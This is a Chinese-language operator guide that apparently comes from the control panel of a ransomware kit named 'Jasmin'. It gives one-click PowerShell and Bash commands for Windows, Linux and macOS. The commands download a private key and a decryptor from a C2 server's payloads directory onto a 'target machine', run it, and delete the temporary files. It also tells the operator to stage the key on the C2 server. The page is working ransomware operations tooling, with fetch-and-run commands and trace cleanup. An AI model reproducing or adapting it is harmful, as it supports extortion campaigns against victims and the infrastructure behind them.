解密教程

🖥️ Windows 一键解密

1在目标机打开 PowerShell (管理员)
2复制下方命令直接运行
命令会自动下载私钥、解密器、执行解密、清理临时文件

一键命令 (PowerShell)

# Windows 一键解密 — 复制整段运行
$tmp="$env:TEMP\jasmin_dec"
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
# 下载私钥 (请先将 private.pem 放到C2服务器 payloads/ 目录)
Invoke-WebRequest "/payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
# 下载解密器
Invoke-WebRequest "/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
# 执行解密
& "$tmp\dec.exe" "$tmp\key.pem"
# 清理
Remove-Item -Recurse -Force $tmp

🐧 Linux 一键解密

1在目标机打开终端
2复制下方命令直接运行
自动安装依赖、下载私钥和解密脚本、执行全盘解密、清理

一键命令 (Bash)

# Linux 一键解密 — 复制整段运行
pip3 install -q cryptography 2>/dev/null
curl -sL /payloads/jasmin_private.pem -o /tmp/.jk
curl -sL /payloads/jasmin_decrypt.py -o /tmp/.jd
python3 /tmp/.jd /tmp/.jk
rm -f /tmp/.jk /tmp/.jd

指定目录解密

python3 /tmp/.jd /tmp/.jk /home/user /var/www /opt

🍎 macOS 一键解密

1打开终端
2复制下方命令直接运行
与Linux相同流程，自动扫描 ~/、/Users、/tmp

一键命令

# macOS 一键解密
pip3 install -q cryptography 2>/dev/null
curl -sL /payloads/jasmin_private.pem -o /tmp/.jk
curl -sL /payloads/jasmin_decrypt.py -o /tmp/.jd
python3 /tmp/.jd /tmp/.jk
rm -f /tmp/.jk /tmp/.jd
使用前准备: 请先将 jasmin_private.pem 和 jasmin_decrypt.py 上传到 C2 服务器的 payloads/ 目录，确保可通过URL访问。
